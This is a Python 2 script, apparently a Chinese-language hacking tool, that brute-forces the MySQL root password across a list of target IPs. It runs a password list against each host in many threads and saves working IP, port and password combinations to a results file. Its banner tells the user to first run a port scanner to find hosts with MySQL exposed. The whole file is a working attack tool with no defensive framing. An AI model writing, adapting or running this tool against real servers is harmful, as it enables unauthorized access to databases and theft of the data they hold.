
# -*- coding: utf-8 -*-
"""
__author__ = 'Langziyanqin'
__QQ__ = '982722261'
              ┏┓      ┏┓
            ┏┛┻━━━┛┻┓
            ┃      ☃      ┃
            ┃  ┳┛  ┗┳  ┃
            ┃      ┻      ┃
            ┗━┓      ┏━┛
                ┃      ┗━━━┓
                ┃  神兽保佑    ┣┓
                ┃　永无BUG！   ┏┛
                ┗┓┓┏━┳┓┏┛
                  ┃┫┫  ┃┫┫
                  ┗┻┛  ┗┻┛
"""
import sys
reload(sys)
sys.setdefaultencoding('utf-8')
import threading
import threadpool
import MySQLdb
import time
import socket
import os
os.system('color a')
timeout = 5
socket.setdefaulttimeout(timeout)
global e11
start_time = time.time()

print unicode('''
-------------------------------------
    Langziyanqing MYSQL Burte
-------------------------------------
密码放在password.txt当中
要爆破的IP放在ips.txt当中
一定要先运行前面的那个批量扫描自定义开放端口的程序
因为你的ip列表有一部分是不允许外部链接
有一部是没有开放3306，mysql服务的
所以当你开启爆破的时候，因为一些ip没办法连接访问
所以程序会一直循环链接，导致最后线程死掉，浪费时间

''','utf-8')
time.sleep(6)
set_port1 = input(unicode('设置扫描的端口(set port):','utf-8').encode('gbk'))
set_port = int(set_port1)
set_thread1 = input(unicode('设置扫描的线程数量(set threads):','utf-8').encode('gbk'))
set_thread = int(set_thread1)
def Crack(password,ip,set_port):
        t1 = '[' + str(time.strftime("%H:%M:%S", time.localtime())) + ']'
        print t1 + 'IP:' + ip + ' Name:root' + ' password:'+ password + ' Port:' + str(set_port) +'\n'
        t2 = str(t1 + 'IP:' + ip + ' Name:root' + ' password:'+ password + ' Port:' + str(set_port) +'\n')
        conn = None
        try:
            conn = MySQLdb.connect(host=ip, user='root', passwd=password, db='test', port=set_port, connect_timeout=5)
            print '************************************************'
            msg = "[+]:%s Username: root Password is: %s" % (ip, password)
            print msg
            print '************************************************'
            output = open('result.txt', 'a+')
            output.write(str(ip) + ":" + str(set_port ) + '  root' + ' ' + str(password) + "\n")
            pass
        except MySQLdb.Error, e:
            print e[1] + '\n'
            with open('log.txt','a') as xie:
                xie.write(t2 + ' ' + str(e[1] + '\n'))
            pass
        finally:
            if conn:
                conn.close()


def start(list1):
    #for i1 in f13:
        #ip = f13.replace('\n','')
        ip = list1
        with open("password.txt", 'r')as d2:
            for d1 in d2:
                password = d1.replace('\n', '')
                # print ip + password
                Crack(password, ip, set_port)

pool = threadpool.ThreadPool(set_thread)
f12 = open('ips.txt','r')
list1 = []
for xxxxx in f12:
    xxxxx1 = xxxxx.replace('\n','')
    list1.append(xxxxx1)
f13 = f12.read()
f12.close()
requests = threadpool.makeRequests(start,list1)
#for i in requests:print i
[pool.putRequest(req) for req in requests]
pool.wait()


print 'over time：%d S'% (time.time()-start_time)
time.sleep(600)
